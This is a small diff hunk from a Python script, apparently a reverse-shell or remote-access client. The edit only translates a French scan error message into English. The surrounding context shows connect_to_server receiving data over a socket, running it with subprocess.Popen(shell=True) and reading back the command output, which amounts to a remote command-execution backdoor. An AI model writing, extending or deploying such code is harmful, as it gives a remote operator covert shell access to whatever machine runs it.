@@ -121,7 +121,7 @@ def connect_to_server():
                         scan_results = execute_scanner(args)
                         s.send(str.encode(scan_results + "\n"))
                     except Exception as e:
-                        s.send(str.encode(f"Erreur lors du scan : {e}\n"))
+                        s.send(str.encode(f"Error during scan : {e}\n"))
                 else:
                     cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
                     output_byte = cmd.stdout.read() + cmd.stderr.read()
